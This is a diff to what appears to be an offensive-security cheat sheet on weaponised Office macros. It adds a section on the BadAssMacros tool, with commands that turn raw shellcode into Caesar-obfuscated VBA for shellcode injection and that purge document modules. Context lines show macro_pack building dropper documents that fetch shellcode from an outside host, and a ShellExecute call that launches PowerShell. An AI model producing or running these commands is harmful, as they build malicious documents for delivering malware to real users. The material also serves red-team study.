@@ -17,6 +17,7 @@
 * [DCOM - WMI COM functions (VBA AMSI)](#docm---wmi-com-functions)
 * [DOCM - winmgmts](#docm---winmgmts)
 * [DOCM - Macro Pack - Macro and DDE](#docmxlm---macro-pack---macro-and-dde)
+* [DOCM - BadAssMacros](#docm---badassmacros)
 * [DOCM - CACTUSTORCH VBA Module](#docm---cactustorch-vba-module)
 * [DOCM - MMG with Custom DL + Exec](#docm---mmg-with-custom-dl--exec)
 * [VBA Obfuscation](#vba-obfuscation)
@@ -326,8 +327,7 @@ SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows
 
 > Only the community version is available online.
 
-* git clone https://github.com/sevagas/macro_pack
-* https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe
+* [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe)
 
 ```powershell
 # Options
@@ -383,6 +383,29 @@ echo "x32calc.bin" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=Alternativ
 echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive
 echo "x86.bin" "x64.bin" | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc
 echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bin" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
+```
+
+## DOCM - BadAssMacros
+
+> C# based automated Malicous Macro Generator.
+
+* https://github.com/Inf0secRabbit/BadAssMacros
+
+```powershell
+BadAssMacros.exe -h
+
+# Create VBA for classic shellcode injection from raw shellcode
+BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file>
+BadAssMacros.exe -i .\Desktop\payload.bin -w doc -p no -s classic -c 23 -o .\Desktop\output.txt
+
+# Create VBA for indirect shellcode injection from raw shellcode
+BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file>
+
+# List modules inside Doc/Excel file
+BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l
+
+# Purge Doc/Excel file
+BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name>
 ```
 
 
